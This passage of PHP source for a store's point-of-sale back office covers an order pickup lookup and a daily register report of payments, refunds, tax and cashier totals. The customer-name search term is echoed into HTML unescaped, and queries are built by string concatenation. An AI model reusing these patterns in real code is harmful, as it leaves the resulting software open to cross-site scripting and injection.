          $resultcontent .= '<h2 style="margin-top:0;"><a href="/store/index.php?action=willcall_pickup&orderid=' . $orderinfo['orders_id'] . '">Order # ' . $orderinfo['orders_id'] . '</a></h2>';
          $resultcontent .= '<h3>Name: ' . $orderinfo['customers_name'] . '</h3>';
          $resultcontent .= '<h3>Email: ' . $orderinfo['customers_email_address'] . '</h3>';
          #$resultcontent .= '<h3>Customer Phone: ' . $orderinfo['customers_telephone'] . '</h3>';
          #if ( $orderinfo['billing_name'] != $orderinfo['customers_name'] ) { $resultcontent .= '<h3>Billing Name: ' . $orderinfo['billing_name'] . '</h3>'; }
          #if ( $orderinfo['delivery_name'] != $orderinfo['customers_name'] && $orderinfo['delivery_name'] != $orderinfo['billing_name'] ) { $resultcontent .= '<h3>Shipping Name: ' . $orderinfo['delivery_name'] . '</h3>'; }
          if ( in_array( $orderinfo['orders_status'], array( 15, 20, 1, 48, 42, 16 ) ) ) { $resultcontent .= '<h4 style="margin:10px;">Order incomplete or cancelled</h4>'; }
          elseif ( $orderinfo['orders_status'] == 36 ) { $resultcontent .= '<h4 style="margin:10px;">Order picked up</h4>'; }
          elseif ( $orderinfo['orders_status'] == 14 ) { $resultcontent .= '<h4 style="margin:10px;">Available to pick up</h4>'; }
          else { $resultcontent .= '<h4 style="margin:10px;">Not ready to pick up</h4>'; }
          $resultcontent .= '</div></div>';
        }
        $resultcounter++;
      }
      if ( $resultcounter == 0 ) { echo '<div class="orderheader"><h2>No orders found for customer name search: <b>' . $search . '</b></h2></div>'; }
      else {
        echo '<div style="overflow:auto;">' . $resultcontent . '</div>';
        if ( $resultcounter > 10 ) { echo '<div class="orderheader"><h2>Additional orders were found but are not displayed. Please narrow down the search.</h2></div>'; }
      }
    }
    elseif ( $search != '' && strlen( $search ) <= 2 ) { echo '<div class="orderheader"><h2>Search query too short.</h2></div>'; }
  ?>
     <div>
      <div class="completecontent">
       <form action="/store/index.php" method="post" id="queryform">
        <input type="hidden" name="action" value="willcall_pickup" />
        <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
        <input type="tel" name="orderid" value="" class="orderlookup" id="orderfield" placeholder="Order number" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9]/g,'');" />
        <input type="text" name="search" value="" class="orderlookup" id="search" placeholder="Search Name" onblur="this.value=this.value.replace(/[^a-zA-Z ]/g,'');" style="margin-top:10px;" />
        <button onclick="this.form.submit();">Look Up Order</button>
       </form>
      </div>
     </div>
  <?php
  }
  elseif ( $action == 'daily_register' ) {
    $paymentsdate = date( "Y-m-d" );
    if ( $_REQUEST['date'] != '' && preg_match( '/^\d\d\d\d-\d\d-\d\d$/', $_REQUEST['date'] ) && in_array( $loginuser, $adminusers ) ) { $paymentsdate = $_REQUEST['date']; }
    if ( $_REQUEST['userid'] != '' ) {
      if ( (int)$loginuser == (int)$_REQUEST['userid'] || in_array( $loginuser, $adminusers ) ) {
        $userquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_id='" . (int)$_REQUEST['userid'] . "'" );
        $userinfo = mysqli_fetch_array( $userquery );
        if ( $userinfo['pos_users_id'] > 0 ) { $userid = $userinfo['pos_users_id']; }
        else { $userid = 0; }
      }
      else { $userid = 0; }
    }
    if ( $userid == 0 ) {
      $paymentsdata = array();
      $paymentscontent = "";
      $paymentscontents = array();
      $settlementcontents = array();
      $paymentsqueryraw = "SELECT ps.payments_store_method, COUNT( ps.payments_store_id ) AS payments_count, SUM( ps.payments_store_amount ) AS payments_total FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) AND ps.pos_users_id='" . $loginuser . "' GROUP BY ps.payments_store_method";
      if ( in_array( $loginuser, $adminusers ) ) {
        $paymentsqueryraw = "SELECT ps.payments_store_method, COUNT( ps.payments_store_id ) AS payments_count, SUM( ps.payments_store_amount ) AS payments_total FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) GROUP BY ps.payments_store_method";
      }
      $paymentsquery = mysqli_query( $link, $paymentsqueryraw );
      while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
        if ( $paymentsinfo['payments_store_method'] == 'Change' ) { $paymentsinfo['payments_store_method'] = 'Cash'; }
        $paymentscontents[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        $settlementcontents[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        #$paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $paymentsinfo['payments_store_method'] . '</td>';
        #$paymentscontent .= '<td style="text-align:right;">$' . number_format( $paymentsinfo['payments_total'], 2 ) . '</td>';
        #$paymentscontent .= '<td style="padding-left:20px;text-align:right;">' . $paymentsinfo['payments_count'] . ' payments</td>';
        #$paymentscontent .= '</tr>';
        $paymentsdata[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        $paymentsdata['total'] += $paymentsinfo['payments_total'];
      }
      foreach ( $paymentscontents as $method => $amount ) {
        if ( $method == 'Credit Card' && in_array( $loginuser, $adminusers ) ) { $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=rorderlist&date=' . $paymentsdate . '&method=creditcard">' . $method . '</a></td>'; }
        elseif ( $method == 'Cash' && in_array( $loginuser, $adminusers ) ) { $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=rorderlist&date=' . $paymentsdate . '&method=cash">' . $method . '</a></td>'; }
        elseif ( $method == 'Gift Card' && in_array( $loginuser, $adminusers ) ) { $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=rorderlist&date=' . $paymentsdate . '&method=giftcard">' . $method . '</a></td>'; }
        elseif ( $method == 'Store Credit' && in_array( $loginuser, $adminusers ) ) { $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=rorderlist&date=' . $paymentsdate . '&method=storecredit">' . $method . '</a></td>'; }
        else { $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>'; }
        $paymentscontent .= '<td style="text-align:right;">$' . number_format( $amount, 2 ) . '</td>';
        $paymentscontent .= '</tr>';
      }
      $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Total</td>';
      $paymentscontent .= '<td style="text-align:right;"><b>$' . number_format( $paymentsdata['total'], 2 ) . '</b></td>';
      $paymentscontent .= '</tr>';
      if ( in_array( $loginuser, array( 8, 33, 14, 19 ) ) ) {
        $taxqueryraw = "SELECT SUM( ot.value ) AS taxtotal FROM orders o LEFT JOIN orders_total ot ON o.orders_id=ot.orders_id WHERE ot.class='ot_tax' AND o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) GROUP BY o.ipisp";
        $taxquery = mysqli_query( $link, $taxqueryraw );
        $taxinfo = mysqli_fetch_array( $taxquery );
        $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Total Sales Tax</a></td><td style="text-align:right;"><b>$' . number_format( $taxinfo['taxtotal'], 2 ) . '</b></td></tr>';
      }

      $refundsdata = array();
      $refundscontent = "";
      $refundscontents = array();
      $refundsqueryraw = "SELECT oref.* FROM orders_refunds oref LEFT JOIN orders o ON oref.orders_id=o.orders_id WHERE oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) AND oref.pos_users_id='" . $loginuser . "'";
      if ( in_array( $loginuser, $adminusers ) ) {
        $refundsqueryraw = "SELECT oref.* FROM orders_refunds oref LEFT JOIN orders o ON oref.orders_id=o.orders_id WHERE oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) AND oref.pos_users_id>0";
      }
      $refundsquery = mysqli_query( $link, $refundsqueryraw );
      while ( $refundsinfo = mysqli_fetch_array( $refundsquery ) ) {
        if ( $refundsinfo['orders_refunds_type'] == 'products' || $refundsinfo['orders_refunds_type'] == 'products_tax' ) {
          $refundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'] * $refundsinfo['orders_refunds_qty'];
          $refundsdata[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
          $refundsdata['total'] += $refundsinfo['orders_refunds_amount'];
          $settlementcontents[$refundsinfo['orders_refunds_method']] -= $refundsinfo['orders_refunds_amount'] * $refundsinfo['orders_refunds_qty'];
        }
        else {
          $refundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
          $refundsdata[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
          $refundsdata['total'] += $refundsinfo['orders_refunds_amount'];
          $settlementcontents[$refundsinfo['orders_refunds_method']] -= $refundsinfo['orders_refunds_amount'];
        }
      }
      foreach ( $refundscontents as $method => $amount ) {
        $refundscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>';
        $refundscontent .= '<td style="text-align:right;">-$' . number_format( $amount, 2 ) . '</td>';
        $refundscontent .= '</tr>';
      }
      if ( $refundscontent != '' ) {
        $refundscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Total</td>';
        $refundscontent .= '<td style="text-align:right;"><b>-$' . number_format( $refundsdata['total'], 2 ) . '</b></td>';
        $refundscontent .= '</tr>';
      }
      if ( in_array( $loginuser, array( 8, 33, 14, 19 ) ) ) {
        $taxqueryraw = "SELECT SUM( oref.orders_refunds_amount * oref.orders_refunds_qty ) AS taxtotal FROM orders_refunds oref LEFT JOIN orders o ON oref.orders_id=o.orders_id WHERE oref.orders_refunds_type='products_tax' AND oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) GROUP BY oref.orders_refunds_type";
        $taxquery = mysqli_query( $link, $taxqueryraw );
        $taxinfo = mysqli_fetch_array( $taxquery );
        $refundscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Total Sales Tax</a></td><td style="text-align:right;"><b>-$' . number_format( $taxinfo['taxtotal'], 2 ) . '</b></td></tr>';
      }

      $ordersqueryraw = "SELECT o.orders_id FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) AND ps.pos_users_id='" . $loginuser . "' GROUP BY o.orders_id";
      if ( in_array( $loginuser, $adminusers ) ) {
        $ordersqueryraw = "SELECT orders_id FROM orders WHERE date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND ipisp='Evike.com Superstore' AND ( customers_gid='Tier 0' OR customers_id IN ( 1194423, 1200305 ) )";
      }
      $ordersquery = mysqli_query( $link, $ordersqueryraw );
      $totalorders = mysqli_num_rows( $ordersquery );
      if ( $totalorders == false ) { $totalorders = 0; }
      #$ordersinfo = mysqli_fetch_array( $ordersquery );

      # Duplicate of above, but for wholesale register
      $wpaymentsdata = array();
      $wpaymentscontent = "";
      $wpaymentscontents = array();
      $wsettlementcontents = array();
      $paymentsqueryraw = "SELECT ps.payments_store_method, COUNT( ps.payments_store_id ) AS payments_count, SUM( ps.payments_store_amount ) AS payments_total FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) AND ps.pos_users_id='" . $loginuser . "' GROUP BY ps.payments_store_method";
      if ( in_array( $loginuser, $adminusers ) ) {
        $paymentsqueryraw = "SELECT ps.payments_store_method, COUNT( ps.payments_store_id ) AS payments_count, SUM( ps.payments_store_amount ) AS payments_total FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) GROUP BY ps.payments_store_method";
      }
      $paymentsquery = mysqli_query( $link, $paymentsqueryraw );
      while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
        if ( $paymentsinfo['payments_store_method'] == 'Change' ) { $paymentsinfo['payments_store_method'] = 'Cash'; }
        $wpaymentscontents[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        $wsettlementcontents[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        $wpaymentsdata[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        $wpaymentsdata['total'] += $paymentsinfo['payments_total'];
      }
      foreach ( $wpaymentscontents as $method => $amount ) {
        if ( $method == 'Credit Card' && in_array( $loginuser, $adminusers ) ) { $wpaymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=worderlist&date=' . $paymentsdate . '&method=creditcard">' . $method . '</a></td>'; }
        elseif ( $method == 'Cash' && in_array( $loginuser, $adminusers ) ) { $wpaymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=worderlist&date=' . $paymentsdate . '&method=cash">' . $method . '</a></td>'; }
        elseif ( $method == 'Gift Card' && in_array( $loginuser, $adminusers ) ) { $wpaymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=worderlist&date=' . $paymentsdate . '&method=giftcard">' . $method . '</a></td>'; }
        elseif ( $method == 'Store Credit' && in_array( $loginuser, $adminusers ) ) { $wpaymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;"><a href="/store/index.php?action=worderlist&date=' . $paymentsdate . '&method=storecredit">' . $method . '</a></td>'; }
        else { $wpaymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>'; }
        $wpaymentscontent .= '<td style="text-align:right;">$' . number_format( $amount, 2 ) . '</td>';
        $wpaymentscontent .= '</tr>';
      }
      $wpaymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Total</td>';
      $wpaymentscontent .= '<td style="text-align:right;"><b>$' . number_format( $wpaymentsdata['total'], 2 ) . '</b></td>';
      if ( in_array( $loginuser, array( 8, 33, 14, 19 ) ) ) {
        $taxqueryraw = "SELECT SUM( ot.value ) AS taxtotal FROM orders o LEFT JOIN orders_total ot ON o.orders_id=ot.orders_id WHERE ot.class='ot_tax' AND o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) GROUP BY o.ipisp";
        $taxquery = mysqli_query( $link, $taxqueryraw );
        $taxinfo = mysqli_fetch_array( $taxquery );
        $wpaymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Total Sales Tax</a></td><td style="text-align:right;"><b>$' . number_format( $taxinfo['taxtotal'], 2 ) . '</b></td></tr>';
      }
      $wpaymentscontent .= '</tr>';

      $wrefundsdata = array();
      $wrefundscontent = "";
      $wrefundscontents = array();
      $refundsqueryraw = "SELECT oref.* FROM orders_refunds oref LEFT JOIN orders o ON oref.orders_id=o.orders_id WHERE oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) AND oref.pos_users_id='" . $loginuser . "'";
      if ( in_array( $loginuser, $adminusers ) ) {
        $refundsqueryraw = "SELECT oref.* FROM orders_refunds oref LEFT JOIN orders o ON oref.orders_id=o.orders_id WHERE oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) AND oref.pos_users_id>0";
      }
      $refundsquery = mysqli_query( $link, $refundsqueryraw );
      while ( $refundsinfo = mysqli_fetch_array( $refundsquery ) ) {
        if ( $refundsinfo['orders_refunds_type'] == 'products' || $refundsinfo['orders_refunds_type'] == 'products_tax' ) {
          $wrefundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'] * $refundsinfo['orders_refunds_qty'];
          $wrefundsdata[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
          $wrefundsdata['total'] += $refundsinfo['orders_refunds_amount'];
          $wsettlementcontents[$refundsinfo['orders_refunds_method']] -= $refundsinfo['orders_refunds_amount'] * $refundsinfo['orders_refunds_qty'];
        }
        else {
          $wrefundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
          $wrefundsdata[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
          $wrefundsdata['total'] += $refundsinfo['orders_refunds_amount'];
          $wsettlementcontents[$refundsinfo['orders_refunds_method']] -= $refundsinfo['orders_refunds_amount'];
        }
      }
      foreach ( $wrefundscontents as $method => $amount ) {
        $wrefundscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>';
        $wrefundscontent .= '<td style="text-align:right;">-$' . number_format( $amount, 2 ) . '</td>';
        $wrefundscontent .= '</tr>';
      }
      if ( $wrefundscontent != '' ) {
        $wrefundscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Total</td>';
        $wrefundscontent .= '<td style="text-align:right;"><b>-$' . number_format( $wrefundsdata['total'], 2 ) . '</b></td>';
        $wrefundscontent .= '</tr>';
      }

      $ordersqueryraw = "SELECT o.orders_id FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) AND ps.pos_users_id='" . $loginuser . "' GROUP BY o.orders_id";
      if ( in_array( $loginuser, $adminusers ) ) {
        $ordersqueryraw = "SELECT orders_id FROM orders WHERE date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND ipisp='Evike.com Superstore' AND customers_gid!='Tier 0' AND customers_id NOT IN ( 1194423, 1200305 )";
      }
      $ordersquery = mysqli_query( $link, $ordersqueryraw );
      $wtotalorders = mysqli_num_rows( $ordersquery );
      if ( $wtotalorders == false ) { $wtotalorders = 0; }
      #$ordersinfo = mysqli_fetch_array( $ordersquery );

      # List of retail non-taxed items
      $notaxcontent = "";
      if ( in_array( $loginuser, $adminusers ) ) {
        $notaxqueryraw = "SELECT op.products_id, SUM( op.products_quantity ) AS tot_qty, SUM( op.products_quantity * op.final_price ) AS tot_value FROM orders_products op LEFT JOIN orders o ON op.orders_id=o.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) AND op.products_tax=0 GROUP BY op.products_id";
        $notaxquery = mysqli_query( $link, $notaxqueryraw );
        while ( $notaxinfo = mysqli_fetch_array( $notaxquery ) ) {
          $notaxcontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $notaxinfo['products_id'] . '</td>';
          $notaxcontent .= '<td style="text-align:center;">' . (int)$notaxinfo['tot_qty'] . '</td>';
          $notaxcontent .= '<td style="text-align:right;">$' . number_format( $notaxinfo['tot_value'], 2 ) . '</td>';
          $notaxcontent .= '</tr>';
        }
      }
?>
   <h1>Daily Register Report</h1>
   <div>
    <!--<div class="completecontent">-->
    <div>
     <h3 style="text-align:center;"><b><?php echo date( "F j, Y (l)", strtotime( $paymentsdate ) ); ?></b><?php if ( $paymentsdate == date( "Y-m-d" ) ) { echo '<br/>As of ' . date( "g:ia" ); } ?></h3>
<?php
      if ( !in_array( $loginuser, $adminusers ) ) {
        echo '<h3 style="text-align:center;"><b>' . $userinfo['pos_users_firstname'] . ' ' . $userinfo['pos_users_lastname'] . '</b></h3>';
        $firstorderquery = mysqli_query( $link, "SELECT o.date_purchased FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $loginuser . "' ORDER BY o.date_purchased ASC LIMIT 1" );
        $firstorderinfo = mysqli_fetch_array( $firstorderquery );
        if ( $firstorderinfo['date_purchased'] != '' ) {
          $firstorderdisp = date( "g:ia", strtotime( $firstorderinfo['date_purchased'] ) );
        }
        $lastorderquery = mysqli_query( $link, "SELECT o.date_purchased FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $loginuser . "' ORDER BY o.date_purchased DESC LIMIT 1" );
        $lastorderinfo = mysqli_fetch_array( $lastorderquery );
        if ( $lastorderinfo['date_purchased'] != '' ) {
          $lastorderdisp = date( "g:ia", strtotime( $lastorderinfo['date_purchased'] ) );
        }
        if ( $firstorderdisp != '' && $lastorderdisp != '' ) {
          echo '<h3 style="text-align:center;"><b>' . $firstorderdisp . ' - ' . $lastorderdisp . '</b></h3>';
        }
      }

      echo '<div style="position:block;float:left;width:300px;min-height:210px;margin:10px;padding:10px;border:1px solid #000;">';
      echo '<h3 style="text-align:center;font-weight:bold;">Retail Register</h3>';
      if ( in_array( $loginuser, $adminusers ) ) { echo '<h3 style="text-align:center;"><a href="/store/index.php?action=rorderlist&date=' . $paymentsdate . '">' . $totalorders . ' orders</a></h3>'; }
      else { echo '<h3 style="text-align:center;">' . $totalorders . ' orders</h3>'; }
      echo '<table style="width:100%;">' . $paymentscontent . '</table>';
      if ( $refundscontent != '' ) {
        if ( in_array( $loginuser, $adminusers ) ) {  echo '<h3 style="text-align:center;"><a href="/store/index.php?action=rorderlist&date=' . $paymentsdate . '&type=refunds">Refunds</a></h3>'; }
        else { echo '<h3 style="text-align:center;">Refunds</h3>'; }
        echo '<table style="width:100%;">' . $refundscontent . '</table>';
      }
      #if ( in_array( $loginuser, $adminusers ) ) {
        echo '<h3 style="text-align:center;">Settlement</h3>';
        $settlementcontent = '';
        foreach ( $settlementcontents as $method => $amount ) {
          $settlementcontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Net ' . $method . '</td>';
          if ( $amount < 0 ) { $settlementcontent .= '<td style="text-align:right;">-$' . number_format( $amount * -1, 2 ) . '</td>'; }
          else { $settlementcontent .= '<td style="text-align:right;">$' . number_format( $amount, 2 ) . '</td>'; }
          $settlementcontent .= '</tr>';
        }
        echo '<table style="width:100%;">' . $settlementcontent . '</table>';
      #}
      echo '</div>';

      echo '<div style="position:block;float:left;width:300px;min-height:210px;margin:10px;padding:10px;border:1px solid #000;">';
      echo '<h3 style="text-align:center;font-weight:bold;">Wholesale Register</h3>';
      if ( in_array( $loginuser, $adminusers ) ) { echo '<h3 style="text-align:center;"><a href="/store/index.php?action=worderlist&date=' . $paymentsdate . '">' . $wtotalorders . ' orders</a></h3>'; }
      else { echo '<h3 style="text-align:center;">' . $wtotalorders . ' orders</h3>'; }
      echo '<table style="width:100%;">' . $wpaymentscontent . '</table>';
      if ( $wrefundscontent != '' ) {
        if ( in_array( $loginuser, $adminusers ) ) {  echo '<h3 style="text-align:center;"><a href="/store/index.php?action=worderlist&date=' . $paymentsdate . '&type=refunds">Refunds</a></h3>'; }
        else { echo '<h3 style="text-align:center;">Refunds</h3>'; }
        echo '<table style="width:100%;">' . $wrefundscontent . '</table>';
      }
      #if ( in_array( $loginuser, $adminusers ) ) {
        echo '<h3 style="text-align:center;">Settlement</h3>';
        $wsettlementcontent = '';
        foreach ( $wsettlementcontents as $method => $amount ) {
          $wsettlementcontent .= '<tr><td style="padding-right:20px;font-weight:bold;">Net ' . $method . '</td>';
          if ( $amount < 0 ) { $wsettlementcontent .= '<td style="text-align:right;">-$' . number_format( $amount * -1, 2 ) . '</td>'; }
          else { $wsettlementcontent .= '<td style="text-align:right;">$' . number_format( $amount, 2 ) . '</td>'; }
          $wsettlementcontent .= '</tr>';
        }
        echo '<table style="width:100%;">' . $wsettlementcontent . '</table>';
      #}
      echo '</div>';

      if ( $notaxcontent != '' ) {
        echo '<div style="position:block;float:left;width:300px;min-height:210px;margin:10px;padding:10px;border:1px solid #000;">';
        echo '<h3 style="text-align:center;font-weight:bold;">Retail Non-taxed Items</h3>';
        echo '<table style="width:100%;">' . $notaxcontent . '</table>';
        echo '</div>';
      }

      echo '<div style="clear:both;"></div>';
?>
    </div>
   </div>
<?php
      if ( in_array( $loginuser, $adminusers ) ) {
        echo '<h2 style="text-align:center;">Register Reports by Cashier</h2>';
        echo '<div>';
        $usersqueryraw = "SELECT ps.pos_users_id FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' GROUP BY ps.pos_users_id";
        $usersquery = mysqli_query( $link, $usersqueryraw );
        while ( $usersqueryinfo = mysqli_fetch_array( $usersquery ) ) {
          echo '<div style="position:block;float:left;width:225px;min-height:210px;margin:10px;padding:10px;border:1px solid #000;">';
          $posuserquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_id='" . $usersqueryinfo['pos_users_id'] . "'" );
          $posuserinfo = mysqli_fetch_array( $posuserquery );
          echo '<h3 style="text-align:center;"><b>' . $posuserinfo['pos_users_firstname'] . ' ' . $posuserinfo['pos_users_lastname'] . '</b></h3>';
          $firstorderquery = mysqli_query( $link, "SELECT o.date_purchased FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $usersqueryinfo['pos_users_id'] . "' ORDER BY o.date_purchased ASC LIMIT 1" );
          $firstorderinfo = mysqli_fetch_array( $firstorderquery );
          if ( $firstorderinfo['date_purchased'] != '' ) {
            $firstorderdisp = date( "g:ia", strtotime( $firstorderinfo['date_purchased'] ) );
          }
          $lastorderquery = mysqli_query( $link, "SELECT o.date_purchased FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $usersqueryinfo['pos_users_id'] . "' ORDER BY o.date_purchased DESC LIMIT 1" );
          $lastorderinfo = mysqli_fetch_array( $lastorderquery );
          if ( $lastorderinfo['date_purchased'] != '' ) {
            $lastorderdisp = date( "g:ia", strtotime( $lastorderinfo['date_purchased'] ) );
          }
          if ( $firstorderdisp != '' && $lastorderdisp != '' ) {
            echo '<h3 style="text-align:center;">' . $firstorderdisp . ' - ' . $lastorderdisp . '</h3>';
          }
